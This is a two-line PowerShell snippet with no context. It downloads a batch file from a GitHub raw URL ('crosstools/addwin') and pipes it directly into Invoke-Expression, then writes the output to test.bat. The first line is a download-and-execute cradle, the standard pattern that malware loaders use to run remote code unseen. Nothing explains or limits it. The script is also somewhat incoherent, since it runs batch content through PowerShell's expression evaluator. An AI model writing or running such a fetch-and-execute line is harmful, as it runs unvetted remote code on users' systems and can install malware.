$AddBat = (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crosstools/addwin/main/add.bat") | Invoke-Expression

Write-Output $AddBat > "test.bat"
